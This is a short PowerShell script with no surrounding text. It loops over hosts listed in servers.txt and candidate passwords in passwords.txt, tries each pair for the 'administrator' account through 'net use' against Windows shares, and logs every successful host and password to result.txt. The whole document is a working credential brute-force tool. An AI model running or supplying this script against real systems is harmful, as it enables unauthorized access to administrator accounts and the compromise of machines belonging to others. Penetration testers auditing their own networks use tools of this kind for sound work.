$username = "administrator"

foreach ($line in Get-Content servers.txt){
foreach ($line2 in Get-Content passwords.txt){
        try{
            
            net use \\$line /user:$username $line2 
            if ($LASTEXITCODE -eq 0) {
            
                echo "$line authenticated with the password $line2"  >> result.txt} 
            
            else {
            
                write-error "Error non zero net use exit code."
                throw $error[0].Exception
            }
        }
        catch [System.Exception]{
            continue
        }

    }
}
